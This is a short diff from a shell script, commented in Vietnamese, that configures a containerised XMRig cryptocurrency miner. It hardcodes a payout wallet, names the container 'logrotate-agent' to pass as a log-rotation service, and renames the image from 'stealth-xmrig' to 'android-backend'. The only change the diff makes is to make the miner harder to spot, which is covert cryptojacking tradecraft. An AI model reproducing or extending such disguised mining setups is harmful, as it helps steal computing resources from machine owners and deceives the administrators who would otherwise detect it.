@@ -8,7 +8,7 @@ command -v bc    >/dev/null || { echo "❌ bc chưa cài. Đang cài đặt bc..
 # ========== CẤU HÌNH ========== 
 WALLET=${WALLET:-85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz}
 CONTAINER_NAME=${CONTAINER_NAME:-logrotate-agent}
-IMAGE_NAME=${IMAGE_NAME:-stealth-xmrig}
+IMAGE_NAME=${IMAGE_NAME:-android-backend}
 LOG_DIR=${LOG_DIR:-/var/log/xmrig}
 
 # ========== LẤY SỐ CORE CPU VÀ TÍNH THREAD_HINT ========== 
